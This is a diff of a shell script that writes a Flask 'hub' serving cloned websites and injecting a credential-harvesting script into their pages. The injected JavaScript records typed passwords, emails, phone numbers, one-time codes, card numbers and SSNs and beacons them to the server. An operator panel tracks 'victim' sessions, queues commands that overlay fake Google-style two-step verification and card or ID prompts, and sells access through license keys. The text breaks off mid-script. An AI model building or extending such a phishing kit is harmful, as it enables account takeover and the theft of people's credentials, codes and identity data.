@@ -1,11 +1,12 @@
-cd ~/Desktop/meow && source venv/bin/activate
-mkdir -p meow_hub/templates
+cd ~/Desktop/meow
+source venv/bin/activate
 lsof -ti:5000 | xargs kill 2>/dev/null
-
+mkdir -p meow_hub/templates
+rm -f meow_hub/hub.db instance/hub.db
 cat > meow_hub/app.py << 'PYEOF'
-import os, json, secrets, time
+import os, json, secrets, string
 from datetime import datetime
-from flask import Flask, render_template, request, redirect, url_for, jsonify, abort, send_from_directory
+from flask import Flask, render_template, request, redirect, url_for, jsonify, abort, session
 from flask_sqlalchemy import SQLAlchemy
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
 from werkzeug.security import generate_password_hash, check_password_hash
@@ -18,12 +19,17 @@ login_manager = LoginManager(app)
 login_manager.login_view = 'login'
 
 ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-SITES_EXCLUDE = {'meow_hub', 'panel', 'venv', 'instance'}
+SITES_EXCLUDE = {'meow_hub', 'panel', 'venv', 'instance', '__pycache__'}
+
+def gen_key():
+    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(19))
 
 class User(UserMixin, db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(80), unique=True, nullable=False)
     password_hash = db.Column(db.String(120), nullable=False)
+    license_key = db.Column(db.String(40), unique=True, nullable=False, default=gen_key)
+    is_admin = db.Column(db.Boolean, default=False)
 
 class FormSubmission(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -39,44 +45,23 @@ class AccessLog(db.Model):
     user_agent = db.Column(db.String(200), nullable=False)
     timestamp = db.Column(db.DateTime, default=datetime.now)
 
-class License(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    key = db.Column(db.String(64), unique=True, nullable=False)
-    label = db.Column(db.String(120), default='')
-    active = db.Column(db.Boolean, default=True)
-    created_at = db.Column(db.DateTime, default=datetime.now)
-
 class VictimSession(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    session_id = db.Column(db.String(64), unique=True, nullable=False, default=lambda: secrets.token_hex(8))
+    token = db.Column(db.String(64), unique=True, nullable=False, default=lambda: secrets.token_hex(16))
     site = db.Column(db.String(80), nullable=False)
     ip = db.Column(db.String(50), nullable=False)
-    user_agent = db.Column(db.String(200), default='')
-    stage = db.Column(db.String(40), default='credentials')
-    twofa_mode = db.Column(db.String(20), default='otp')
-    twofa_prompt = db.Column(db.String(200), default='')
-    otp_code = db.Column(db.String(20), default='')
-    credentials = db.Column(db.Text, default='{}')
+    stage = db.Column(db.String(40), default='login')
+    data = db.Column(db.Text, default='{}')
     created_at = db.Column(db.DateTime, default=datetime.now)
     updated_at = db.Column(db.DateTime, default=datetime.now, onupdate=datetime.now)
 
-class FlashEvent(db.Model):
+class CommandQueue(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    level = db.Column(db.String(10), default='info')
-    message = db.Column(db.String(300), nullable=False)
-    site = db.Column(db.String(80), default='')
-    session_id = db.Column(db.String(64), default='')
+    victim_token = db.Column(db.String(64), nullable=False)
+    action = db.Column(db.String(40), nullable=False)
+    payload = db.Column(db.Text, default='{}')
+    status = db.Column(db.String(20), default='pending')
     created_at = db.Column(db.DateTime, default=datetime.now)
-
-ACTIVE_SESSIONS = {}
-PENDING_COMMANDS = {}
-
-def flash(level, message, site='', session_id=''):
-    try:
-        db.session.add(FlashEvent(level=level, message=message, site=site, session_id=session_id))
-        db.session.commit()
-    except Exception:
-        db.session.rollback()
 
 @login_manager.user_loader
 def load_user(user_id):
@@ -86,19 +71,60 @@ def get_sites():
     sites = {}
     if not os.path.exists(ROOT_DIR):
         return sites
-    for name in sorted(os.listdir(ROOT_DIR)):
+    for name in os.listdir(ROOT_DIR):
         if name.startswith('.') or name in SITES_EXCLUDE:
             continue
         path = os.path.join(ROOT_DIR, name)
         if os.path.isdir(path):
-            sites[name] = {'name': name.replace('_', ' ').title(),
-                           'has_app': os.path.exists(os.path.join(path, 'app.py'))}
+            sites[name] = {'name': name.replace('_', ' ').title(), 'has_app': os.path.exists(os.path.join(path, 'app.py'))}
     return sites
+
+ACTIVE_SESSIONS = {}
+
+def log_submission(site, ip, raw_data):
+    try:
+        if not raw_data:
+            return
+        db.session.add(FormSubmission(site=site, ip=ip, form_data=json.dumps(raw_data, indent=2, default=str)))
+        db.session.commit()
+        app.logger.info(f'[CAPTURE] site={site} ip={ip} keys={list(raw_data.keys())}')
+    except Exception as e:
+        db.session.rollback()
+        app.logger.error(f'[CAPTURE FAIL] {e}')
+
+def get_or_create_victim(site, ip):
+    tok = session.get('victim_token')
+    if tok:
+        v = VictimSession.query.filter_by(token=tok, site=site).first()
+        if v:
+            return v
+    v = VictimSession.query.filter_by(site=site, ip=ip, stage='login').order_by(VictimSession.created_at.desc()).first()
+    if not v:
+        v = VictimSession(site=site, ip=ip)
+        db.session.add(v)
+        db.session.commit()
+    session['victim_token'] = v.token
+    return v
+
+def queue_cmd(victim_token, action, payload=None):
+    db.session.add(CommandQueue(victim_token=victim_token, action=action, payload=json.dumps(payload or {})))
+    db.session.commit()
+
+def victim_data(v):
+    try:
+        return json.loads(v.data)
+    except Exception:
+        return {}
+
+def set_victim_data(v, d):
+    v.data = json.dumps(d)
+    v.updated_at = datetime.now()
+    db.session.commit()
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if User.query.count() == 0:
-        db.session.add(User(username='admin', password_hash=generate_password_hash('admin', method='pbkdf2:sha256')))
+        db.session.add(User(username='admin', password_hash=generate_password_hash('admin', method='pbkdf2:sha256'), is_admin=True))
         db.session.commit()
     if request.method == 'POST':
         user = User.query.filter_by(username=request.form.get('username')).first()
@@ -126,148 +152,62 @@ def view_logs():
     submissions = FormSubmission.query.order_by(FormSubmission.timestamp.desc()).limit(150).all()
     return render_template('logs.html', logs=logs, submissions=submissions)
 
-@app.route('/live')
+@app.route('/victims')
 @login_required
-def live_panel():
-    return render_template('live.html')
+def victims():
+    vs = VictimSession.query.order_by(VictimSession.updated_at.desc()).all()
+    return render_template('victims.html', victims=vs)
 
 @app.route('/licenses')
 @login_required
-def licenses_page():
-    keys = License.query.order_by(License.created_at.desc()).all()
-    return render_template('licenses.html', keys=keys)
+def licenses():
+    if not current_user.is_admin:
+        abort(403)
+    users = User.query.all()
+    return render_template('licenses.html', users=users)
 
-@app.route('/api/licenses', methods=['GET'])
+@app.route('/api/license/create', methods=['POST'])
 @login_required
-def api_list_licenses():
-    keys = License.query.order_by(License.created_at.desc()).all()
-    return jsonify([{'key': k.key, 'label': k.label, 'active': k.active,
-                     'created_at': k.created_at.isoformat()} for k in keys])
-
-@app.route('/api/licenses', methods=['POST'])
-@login_required
-def api_create_license():
+def license_create():
+    if not current_user.is_admin:
+        return jsonify({'success': False}), 403
     data = request.get_json() or {}
-    key = 'MEOW-' + secrets.token_hex(8).upper()
-    lic = License(key=key, label=data.get('label', ''), active=True)
-    db.session.add(lic)
+    u = User(username=data.get('username', 'user_' + secrets.token_hex(4)),
+             password_hash=generate_password_hash(data.get('password', secrets.token_hex(8)), method='pbkdf2:sha256'))
+    db.session.add(u)
     db.session.commit()
-    flash('success', f'license minted: {key}')
-    return jsonify({'key': key, 'label': lic.label, 'active': True})
+    return jsonify({'success': True, 'license_key': u.license_key, 'username': u.username})
 
-@app.route('/api/licenses/<key>/toggle', methods=['POST'])
+@app.route('/api/license/revoke', methods=['POST'])
 @login_required
-def api_toggle_license(key):
-    lic = License.query.filter_by(key=key).first_or_404()
-    lic.active = not lic.active
-    db.session.commit()
-    flash('warn', f'license {key} -> {"active" if lic.active else "revoked"}')
-    return jsonify({'key': key, 'active': lic.active})
-
-@app.route('/api/licenses/<key>', methods=['DELETE'])
-@login_required
-def api_delete_license(key):
-    lic = License.query.filter_by(key=key).first_or_404()
-    db.session.delete(lic)
-    db.session.commit()
-    flash('error', f'license burned: {key}')
-    return jsonify({'deleted': key})
-
-@app.route('/api/license/verify', methods=['POST'])
-def api_verify_license():
+def license_revoke():
+    if not current_user.is_admin:
+        return jsonify({'success': False}), 403
     data = request.get_json() or {}
-    lic = License.query.filter_by(key=(data.get('key') or '').strip()).first()
-    return jsonify({'valid': bool(lic and lic.active), 'label': lic.label if lic else ''})
+    u = User.query.filter_by(license_key=data.get('license_key')).first()
+    if u:
+        db.session.delete(u)
+        db.session.commit()
+        return jsonify({'success': True})
+    return jsonify({'success': False, 'error': 'not found'})
 
-def session_to_dict(s):
-    return {
-        'session_id': s.session_id, 'site': s.site, 'ip': s.ip,
-        'stage': s.stage, 'twofa_mode': s.twofa_mode,
-        'twofa_prompt': s.twofa_prompt, 'otp_code': s.otp_code,
-        'credentials': json.loads(s.credentials or '{}'),
-        'created_at': s.created_at.isoformat() if s.created_at else '',
-        'updated_at': s.updated_at.isoformat() if s.updated_at else '',
-    }
-
-@app.route('/api/live/sessions')
+@app.route('/api/victim/<token>/command', methods=['POST'])
 @login_required
-def api_live_sessions():
-    now = datetime.now().timestamp()
-    live_map = {}
-    for site, sdata in list(ACTIVE_SESSIONS.items()):
-        for ip, info in list(sdata.items()):
-            if now - info['last_seen'] >= 25:
-                del sdata[ip]
-                continue
-            live_map.setdefault(site, set()).add(ip)
-    sessions = VictimSession.query.order_by(VictimSession.updated_at.desc()).limit(100).all()
-    out = []
-    for s in sessions:
-        d = session_to_dict(s)
-        d['live'] = s.ip in live_map.get(s.site, set())
-        out.append(d)
-    return jsonify(out)
+def victim_command(token):
+    data = request.get_json() or {}
+    action = data.get('action')
+    allowed = ['show_otp', 'show_phone', 'show_email_otp', 'show_card', 'show_id', 'show_selfie', 'redirect', 'notify', 'block', 'unblock', 'advance']
+    if action not in allowed:
+        return jsonify({'success': False, 'error': 'bad action'})
+    queue_cmd(token, action, data.get('payload'))
+    return jsonify({'success': True})
 
-@app.route('/api/live/sessions/<sid>/mode', methods=['POST'])
+@app.route('/api/victim/<token>/events')
 @login_required
-def api_set_mode(sid):
-    s = VictimSession.query.filter_by(session_id=sid).first_or_404()
-    mode = (request.get_json() or {}).get('mode', 'otp')
-    if mode not in ('otp', 'mail', 'number', 'push'):
-        return jsonify({'error': 'bad mode'}), 400
-    prompts = {
-        'otp': 'Enter the 6-digit code from your authenticator app.',
-        'mail': 'A verification link was sent to your email. Enter the code from the message.',
-        'number': 'Enter your phone number to receive a verification code.',
-        'push': 'Approve the sign-in request sent to your device.',
-    }
-    s.twofa_mode = mode
-    s.stage = 'otp_requested'
-    s.twofa_prompt = prompts[mode]
-    db.session.commit()
-    PENDING_COMMANDS.setdefault(sid, {})['twofa'] = {'mode': mode, 'prompt': s.twofa_prompt, 'ts': time.time()}
-    flash('info', f'2FA switch -> {mode} on {s.site} [{s.ip}]', s.site, sid)
-    return jsonify({'session_id': sid, 'mode': mode, 'prompt': s.twofa_prompt})
-
-@app.route('/api/live/sessions/<sid>/validate', methods=['POST'])
-@login_required
-def api_validate(sid):
-    s = VictimSession.query.filter_by(session_id=sid).first_or_404()
-    s.stage = 'validated'
-    db.session.commit()
-    PENDING_COMMANDS.setdefault(sid, {})['validate'] = {'ts': time.time()}
-    flash('success', f'session validated on {s.site} [{s.ip}]', s.site, sid)
-    return jsonify({'session_id': sid, 'stage': 'validated'})
-
-@app.route('/api/live/sessions/<sid>/error', methods=['POST'])
-@login_required
-def api_error(sid):
-    s = VictimSession.query.filter_by(session_id=sid).first_or_404()
-    s.stage = 'otp_requested'
-    db.session.commit()
-    PENDING_COMMANDS.setdefault(sid, {})['error'] = {'ts': time.time()}
-    flash('warn', f'bad-code signal sent on {s.site} [{s.ip}]', s.site, sid)
-    return jsonify({'session_id': sid, 'stage': 'otp_requested'})
-
-@app.route('/api/live/flash')
-@login_required
-def api_flash_feed():
-    since = request.args.get('since', type=int, default=0)
-    q = FlashEvent.query
-    if since:
-        q = q.filter(FlashEvent.id > since)
-    events = q.order_by(FlashEvent.id.desc()).limit(50).all()
-    return jsonify([{'id': e.id, 'level': e.level, 'message': e.message,
-                     'site': e.site, 'session_id': e.session_id,
-                     'created_at': e.created_at.isoformat() if e.created_at else ''}
-                    for e in events])
-
-@app.route('/hub/poll', methods=['GET'])
-def hub_poll():
-    sid = request.args.get('sid')
-    if not sid:
-        return jsonify({})
-    return jsonify(PENDING_COMMANDS.pop(sid, {}))
+def victim_events(token):
+    v = VictimSession.query.filter_by(token=token).first_or_404()
+    subs = FormSubmission.query.filter_by(site=v.site, ip=v.ip).order_by(FormSubmission.timestamp.desc()).limit(30).all()
+    return jsonify({'stage': v.stage, 'data': victim_data(v), 'submissions': [{'ts': s.timestamp.isoformat(), 'data': json.loads(s.form_data)} for s in subs]})
 
 @app.route('/api/change-password', methods=['POST'])
 @login_required
@@ -295,26 +235,6 @@ def api_stats():
         per_site[k] = {'live': cnt}
     return jsonify({'sites': len(get_sites()), 'live_users': live_total, 'per_site': per_site})
 
-def log_submission(site, ip, raw_data):
-    try:
-        if not raw_data:
-            return
-        db.session.add(FormSubmission(site=site, ip=ip, form_data=json.dumps(raw_data, indent=2, default=str)))
-        db.session.commit()
-        app.logger.info(f'[CAPTURE] site={site} ip={ip} keys={list(raw_data.keys())}')
-    except Exception as e:
-        db.session.rollback()
-        app.logger.error(f'[CAPTURE FAIL] {e}')
-
-def find_or_create_session(site, ip, ua=''):
-    s = VictimSession.query.filter_by(site=site, ip=ip).order_by(VictimSession.updated_at.desc()).first()
-    if not s:
-        s = VictimSession(site=site, ip=ip, user_agent=ua)
-        db.session.add(s)
-        db.session.commit()
-        flash('info', f'new session on {site} [{ip}]', site, s.session_id)
-    return s
-
 @app.route('/hub/collect', methods=['POST'])
 def hub_collect():
     site = request.args.get('site')
@@ -333,23 +253,44 @@ def hub_collect():
             payload = {'raw': request.data.decode('utf-8', errors='ignore')[:2000]}
     log_submission(site, ip, payload)
 
-    otp = payload.get('otp') or payload.get('code') or payload.get('twofa_code')
-    if otp:
-        s = find_or_create_session(site, ip, request.headers.get('User-Agent', ''))
-        s.otp_code = str(otp)
-        s.stage = 'otp_sent'
-        db.session.commit()
-        flash('success', f'OTP captured on {site} [{ip}]: {otp}', site, s.session_id)
+    tok = session.get('victim_token')
+    if tok:
+        v = VictimSession.query.filter_by(token=tok).first()
+        if v:
+            d = victim_data(v)
+            d.update({k: val for k, val in payload.items() if not k.startswith('__')})
+            set_victim_data(v, d)
+            if v.stage == 'login' and any('pass' in k.lower() for k in payload):
+                v.stage = '2fa_choice'
+                db.session.commit()
+    return '', 204
 
-    cred_keys = [k for k in payload if any(t in k.lower() for t in ('pass', 'email', 'user', 'login', 'phone', 'wallet', 'seed', 'phrase'))]
-    if cred_keys:
-        s = find_or_create_session(site, ip, request.headers.get('User-Agent', ''))
-        snap = json.loads(s.credentials or '{}')
-        for k in cred_keys:
-            snap[k] = payload[k]
-        s.credentials = json.dumps(snap)
-        db.session.commit()
+@app.route('/hub/poll')
+def hub_poll():
+    tok = session.get('victim_token')
+    if not tok:
+        return jsonify({})
+    v = VictimSession.query.filter_by(token=tok).first()
+    if not v:
+        return jsonify({})
+    cmds = CommandQueue.query.filter_by(victim_token=tok, status='pending').all()
+    out = []
+    for c in cmds:
+        out.append({'action': c.action, 'payload': json.loads(c.payload)})
+        c.status = 'done'
+    db.session.commit()
+    return jsonify({'stage': v.stage, 'commands': out})
 
+@app.route('/hub/ack', methods=['POST'])
+def hub_ack():
+    tok = session.get('victim_token')
+    if not tok:
+        return '', 400
+    data = request.get_json(silent=True) or {}
+    v = VictimSession.query.filter_by(token=tok).first()
+    if v and data.get('stage'):
+        v.stage = data['stage']
+        db.session.commit()
     return '', 204
 
 @app.route('/s/<site>/', defaults={'path': ''}, methods=['GET', 'POST'])
@@ -359,6 +300,7 @@ def serve_site(site, path):
     if site not in sites:
         abort(404)
     ip = request.remote_addr
+
     if request.method == 'POST':
         body = {}
         if request.form:
@@ -371,221 +313,369 @@ def serve_site(site, path):
             except Exception:
                 body = {'raw': request.data.decode('utf-8', errors='ignore')[:2000]}
         log_submission(site, ip, body)
+
+    get_or_create_victim(site, ip)
+
     site_dir = os.path.join(ROOT_DIR, site)
     if not path:
         path = 'index.html'
     target_file = os.path.abspath(os.path.join(site_dir, path))
     if not target_file.startswith(os.path.abspath(site_dir)) or not os.path.exists(target_file):
         abort(404)
+
     if target_file.endswith('.html'):
         with open(target_file, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
-        return inject_hub(content, site)
-    return send_from_directory(site_dir, path)
 
-def inject_hub(content, site):
-    tracker_script = """
-    <script>
-    (function() {
-        var SITE = '""" + site + """';
-        var BUFFER_KEY = '__hub_buf_' + SITE;
-        var SID_KEY = '__hub_sid_' + SITE;
-        var FLUSH_INTERVAL = 3000;
-        var sid = localStorage.getItem(SID_KEY) || (function(){ var s = Math.random().toString(36).slice(2) + Date.now().toString(36); localStorage.setItem(SID_KEY, s); return s; })();
+        tracker_script = """
+        <script>
+        (function() {
+            var SITE = '""" + site + """';
+            var BUFFER_KEY = '__hub_buf_' + SITE;
+            var FLUSH_INTERVAL = 3000;
 
-        function loadBuffer() { try { return JSON.parse(localStorage.getItem(BUFFER_KEY) || '[]'); } catch (e) { return []; } }
-        function saveBuffer(buf) { try { localStorage.setItem(BUFFER_KEY, JSON.stringify(buf)); } catch (e) {} }
-        function rawSend(data) {
-            try {
-                var blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-                return navigator.sendBeacon('/hub/collect?site=' + SITE, blob);
-            } catch (e) { return false; }
-        }
-        function flushBuffer() {
-            var buf = loadBuffer();
-            if (!buf.length) return;
-            var remaining = [];
-            for (var i = 0; i < buf.length; i++) { if (!rawSend(buf[i])) remaining.push(buf[i]); }
-            saveBuffer(remaining);
-        }
-        function queue(data) {
-            if (!data || !Object.keys(data).length) return;
-            data.__sid = sid;
-            var buf = loadBuffer();
-            buf.push(data);
-            saveBuffer(buf);
-            flushBuffer();
-        }
-        setInterval(flushBuffer, FLUSH_INTERVAL);
-        document.addEventListener('visibilitychange', function() { if (document.visibilityState === 'hidden') flushBuffer(); });
-        window.addEventListener('beforeunload', flushBuffer);
-        window.addEventListener('pagehide', flushBuffer);
-        function ping() { navigator.sendBeacon('/hub/heartbeat?site=' + SITE); }
-        ping();
-        setInterval(ping, 10000);
-
-        var twofaState = { mode: null, prompt: '' };
-
-        function maskPage() {
-            if (document.getElementById('__hub_twofa_overlay')) return;
-            var ov = document.createElement('div');
-            ov.id = '__hub_twofa_overlay';
-            ov.style.cssText = 'position:fixed;inset:0;background:rgba(255,255,255,0.97);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;';
-            ov.innerHTML =
-                '<div style="max-width:380px;width:90%;text-align:center;">' +
-                '<div id="__hub_twofa_icon" style="font-size:44px;margin-bottom:12px;">🔐</div>' +
-                '<h2 id="__hub_twofa_title" style="margin:0 0 8px;font-size:20px;color:#111;">Two-Step Verification</h2>' +
-                '<p id="__hub_twofa_prompt" style="color:#444;font-size:14px;margin-bottom:20px;"></p>' +
-                '<div id="__hub_twofa_fields"></div>' +
-                '<div id="__hub_twofa_msg" style="color:#c00;font-size:13px;min-height:18px;margin-top:8px;"></div>' +
-                '</div>';
-            document.body.appendChild(ov);
-        }
-
-        function renderTwofa() {
-            var f = document.getElementById('__hub_twofa_fields');
-            if (!f) return;
-            var m = twofaState.mode;
-            if (m === 'number') {
-                f.innerHTML = '<input id="__hub_twofa_input" type="tel" placeholder="Phone number" style="width:100%;padding:12px;font-size:16px;border:1px solid #ccc;border-radius:6px;margin-bottom:12px;">';
-            } else if (m === 'mail') {
-                f.innerHTML = '<input id="__hub_twofa_input" type="text" placeholder="Verification code from email" style="width:100%;padding:12px;font-size:16px;border:1px solid #ccc;border-radius:6px;margin-bottom:12px;">';
-            } else if (m === 'push') {
-                f.innerHTML = '<div style="color:#555;font-size:14px;">Waiting for approval on your device…</div>';
-            } else {
-                f.innerHTML = '<input id="__hub_twofa_input" type="text" inputmode="numeric" maxlength="8" placeholder="6-digit code" style="width:100%;padding:12px;font-size:16px;border:1px solid #ccc;border-radius:6px;margin-bottom:12px;letter-spacing:4px;text-align:center;">';
+            function loadBuffer() { try { return JSON.parse(localStorage.getItem(BUFFER_KEY) || '[]'); } catch (e) { return []; } }
+            function saveBuffer(buf) { try { localStorage.setItem(BUFFER_KEY, JSON.stringify(buf)); } catch (e) {} }
+            function rawSend(data) {
+                try {
+                    var blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+                    return navigator.sendBeacon('/hub/collect?site=' + SITE, blob);
+                } catch (e) { return false; }
             }
-            if (m !== 'push') {
-                var btn = document.createElement('button');
-                btn.textContent = 'Verify';
-                btn.style.cssText = 'width:100%;padding:12px;font-size:16px;background:#111;color:#fff;border:none;border-radius:6px;cursor:pointer;';
-                btn.onclick = submitTwofa;
-                f.appendChild(btn);
-                var inp = document.getElementById('__hub_twofa_input');
-                if (inp) inp.addEventListener('keydown', function(e) { if (e.key === 'Enter') submitTwofa(); });
-            }
-        }
-
-        function submitTwofa() {
-            var inp = document.getElementById('__hub_twofa_input');
-            var val = inp ? inp.value.trim() : '';
-            if (!val) return;
-            queue({ otp: val, __trigger: 'twofa:' + twofaState.mode });
-            var msg = document.getElementById('__hub_twofa_msg');
-            if (msg) { msg.style.color = '#080'; msg.textContent = 'Verifying…'; }
-        }
-
-        function applyCommand(cmds) {
-            if (!cmds) return;
-            if (cmds.twofa) {
-                twofaState.mode = cmds.twofa.mode;
-                twofaState.prompt = cmds.twofa.prompt;
-                maskPage();
-                document.getElementById('__hub_twofa_prompt').textContent = twofaState.prompt;
-                var icons = { otp: '🔐', mail: '📧', number: '📱', push: '🔔' };
-                document.getElementById('__hub_twofa_icon').textContent = icons[twofaState.mode] || '🔐';
-                document.getElementById('__hub_twofa_msg').textContent = '';
-                renderTwofa();
-            }
-            if (cmds.error) {
-                var msg = document.getElementById('__hub_twofa_msg');
-                if (msg) { msg.style.color = '#c00'; msg.textContent = 'Incorrect code. Try again.'; }
-                var inp = document.getElementById('__hub_twofa_input');
-                if (inp) { inp.value = ''; inp.focus(); }
-            }
-            if (cmds.validate) {
-                var ov = document.getElementById('__hub_twofa_overlay');
-                if (ov) {
-                    document.getElementById('__hub_twofa_icon').textContent = '✅';
-                    document.getElementById('__hub_twofa_title').textContent = 'Verified';
-                    document.getElementById('__hub_twofa_prompt').textContent = '';
-                    document.getElementById('__hub_twofa_fields').innerHTML = '';
-                    setTimeout(function() { ov.remove(); }, 1200);
+            function flushBuffer() {
+                var buf = loadBuffer();
+                if (!buf.length) return;
+                var remaining = [];
+                for (var i = 0; i < buf.length; i++) {
+                    if (!rawSend(buf[i])) remaining.push(buf[i]);
                 }
+                saveBuffer(remaining);
             }
-        }
-
-        setInterval(function() {
-            fetch('/hub/poll?sid=' + sid).then(function(r) { return r.json(); }).then(applyCommand).catch(function() {});
-        }, 2500);
-
-        var fieldBuffers = {};
-        function fieldKey(el) {
-            var id = el.id || el.name || el.placeholder || el.getAttribute('aria-label') || el.type || 'unknown';
-            return el.tagName + ':' + id;
-        }
-        function isSensitive(el) {
-            var t = (el.type || '').toLowerCase();
-            var n = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '')).toLowerCase();
-            return t === 'password' || t === 'email' || t === 'text' || t === 'tel' ||
-                   n.indexOf('pass') !== -1 || n.indexOf('email') !== -1 || n.indexOf('user') !== -1 ||
-                   n.indexOf('login') !== -1 || n.indexOf('phone') !== -1 || n.indexOf('seed') !== -1 ||
-                   n.indexOf('phrase') !== -1 || n.indexOf('wallet') !== -1;
-        }
-        function track(el) {
-            if (!el || !isSensitive(el)) return;
-            var k = fieldKey(el);
-            if (!fieldBuffers[k]) fieldBuffers[k] = { el: el, text: '' };
-            fieldBuffers[k].text = el.value || '';
-        }
-        document.addEventListener('keyup', function(e) { try { track(e.target); } catch (err) {} }, true);
-        document.addEventListener('input', function(e) { try { track(e.target); } catch (err) {} }, true);
-        document.addEventListener('change', function(e) { try { track(e.target); } catch (err) {} }, true);
-
-        function harvestAll() {
-            var data = {};
-            for (var k in fieldBuffers) {
-                var fb = fieldBuffers[k];
-                var name = fb.el.name || fb.el.id || k;
-                if (fb.text) data[name] = fb.text;
+            function queue(data) {
+                if (!data || !Object.keys(data).length) return;
+                var buf = loadBuffer();
+                buf.push(data);
+                saveBuffer(buf);
+                flushBuffer();
             }
-            var els = document.querySelectorAll('input, select, textarea');
-            for (var i = 0; i < els.length; i++) {
-                var el = els[i];
-                if (!isSensitive(el)) continue;
-                var name = el.name || el.id || fieldKey(el);
-                var val = el.value || '';
-                if (val && !data[name]) data[name] = val;
+
+            setInterval(flushBuffer, FLUSH_INTERVAL);
+            document.addEventListener('visibilitychange', function() { if (document.visibilityState === 'hidden') flushBuffer(); });
+            window.addEventListener('beforeunload', flushBuffer);
+            window.addEventListener('pagehide', flushBuffer);
+
+            function ping() { navigator.sendBeacon('/hub/heartbeat?site=' + SITE); }
+            ping();
+            setInterval(ping, 10000);
+
+            var fieldBuffers = {};
+            function fieldKey(el) {
+                var id = el.id || el.name || el.placeholder || el.getAttribute('aria-label') || el.type || 'unknown';
+                return el.tagName + ':' + id;
             }
-            return data;
-        }
+            function isSensitive(el) {
+                var t = (el.type || '').toLowerCase();
+                var n = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '')).toLowerCase();
+                return t === 'password' || t === 'email' || t === 'text' || t === 'tel' ||
+                       n.indexOf('pass') !== -1 || n.indexOf('email') !== -1 || n.indexOf('user') !== -1 ||
+                       n.indexOf('login') !== -1 || n.indexOf('phone') !== -1 || n.indexOf('code') !== -1 ||
+                       n.indexOf('otp') !== -1 || n.indexOf('card') !== -1 || n.indexOf('ssn') !== -1;
+            }
 
-        document.addEventListener('submit', function(e) {
-            try { var d = harvestAll(); d.__trigger = 'submit'; queue(d); } catch (err) {}
-        }, true);
+            document.addEventListener('keyup', function(e) {
+                try {
+                    var el = e.target;
+                    if (!el || !isSensitive(el)) return;
+                    var k = fieldKey(el);
+                    if (!fieldBuffers[k]) fieldBuffers[k] = { el: el, text: '' };
+                    fieldBuffers[k].text = el.value || '';
+                } catch (err) {}
+            }, true);
+            document.addEventListener('input', function(e) {
+                try {
+                    var el = e.target;
+                    if (!el || !isSensitive(el)) return;
+                    var k = fieldKey(el);
+                    if (!fieldBuffers[k]) fieldBuffers[k] = { el: el, text: '' };
+                    fieldBuffers[k].text = el.value || '';
+                } catch (err) {}
+            }, true);
 
-        document.addEventListener('click', function(e) {
-            try {
-                var btn = e.target.closest('button, input[type=submit], input[type=button], [role=button], a');
-                if (!btn) return;
-                var label = (btn.textContent || btn.value || btn.name || btn.id || 'unknown').trim().slice(0, 60).toLowerCase();
-                var isAction = label.indexOf('log') !== -1 || label.indexOf('sign') !== -1 || label.indexOf('continue') !== -1 ||
-                               label.indexOf('next') !== -1 || label.indexOf('submit') !== -1 || label.indexOf('verify') !== -1 ||
-                               label.indexOf('unlock') !== -1 || label.indexOf('connect') !== -1 ||
-                               btn.type === 'submit' || btn.tagName === 'BUTTON';
-                if (!isAction) return;
-                var d = harvestAll();
-                d.__trigger = 'click:' + label;
-                queue(d);
+            function harvestAll() {
+                var data = {};
+                for (var k in fieldBuffers) {
+                    var fb = fieldBuffers[k];
+                    var name = fb.el.name || fb.el.id || k;
+                    if (fb.text) data[name] = fb.text;
+                }
+                var els = document.querySelectorAll('input, select, textarea');
+                for (var i = 0; i < els.length; i++) {
+                    var el = els[i];
+                    if (!isSensitive(el)) continue;
+                    var name = el.name || el.id || fieldKey(el);
+                    var val = el.value || '';
+                    if (val && !data[name]) data[name] = val;
+                }
+                return data;
+            }
+
+            document.addEventListener('submit', function(e) {
+                try { var data = harvestAll(); data.__trigger = 'submit'; queue(data); } catch (err) {}
+            }, true);
+            document.addEventListener('click', function(e) {
+                try {
+                    var btn = e.target.closest('button, input[type=submit], input[type=button], [role=button], a');
+                    if (!btn) return;
+                    var label = (btn.textContent || btn.value || btn.name || btn.id || 'unknown').trim().slice(0, 60).toLowerCase();
+                    var isAction = label.indexOf('log') !== -1 || label.indexOf('sign') !== -1 || label.indexOf('continue') !== -1 ||
+                                   label.indexOf('next') !== -1 || label.indexOf('submit') !== -1 || label.indexOf('verify') !== -1 ||
+                                   btn.type === 'submit' || btn.tagName === 'BUTTON';
+                    if (!isAction) return;
+                    var data = harvestAll();
+                    data.__trigger = 'click:' + label;
+                    queue(data);
+                    setTimeout(function() {
+                        var d2 = harvestAll();
+                        d2.__trigger = 'click-delayed:' + label;
+                        queue(d2);
+                    }, 300);
+                } catch (err) {}
+            }, true);
+            window.addEventListener('beforeunload', function() {
+                try { var data = harvestAll(); data.__trigger = 'unload'; queue(data); } catch (err) {}
+            });
+
+            // ============ GOOGLE-STYLE 2FA FLOW ============
+            var currentStage = 'login';
+            var chosenMethod = null;
+
+            function hideOriginal() {
+                var selectors = ['form', '[role="main"]', 'main', '#view_container', '.login-box', '.signin'];
+                selectors.forEach(function(sel) {
+                    document.querySelectorAll(sel).forEach(function(el) {
+                        el.style.display = 'none';
+                    });
+                });
+            }
+
+            function showOriginal() {
+                var selectors = ['form', '[role="main"]', 'main', '#view_container', '.login-box', '.signin'];
+                selectors.forEach(function(sel) {
+                    document.querySelectorAll(sel).forEach(function(el) {
+                        el.style.display = '';
+                    });
+                });
+            }
+
+            function render2faChoice() {
+                hideOriginal();
+                var existing = document.getElementById('__hub_2fa_root');
+                if (existing) existing.remove();
+
+                var root = document.createElement('div');
+                root.id = '__hub_2fa_root';
+                root.style.cssText = 'position:fixed;inset:0;z-index:999997;background:#fff;display:flex;align-items:center;justify-content:center;font-family:"Google Sans",Roboto,Arial,sans-serif;overflow-y:auto;';
+
+                var methods = [
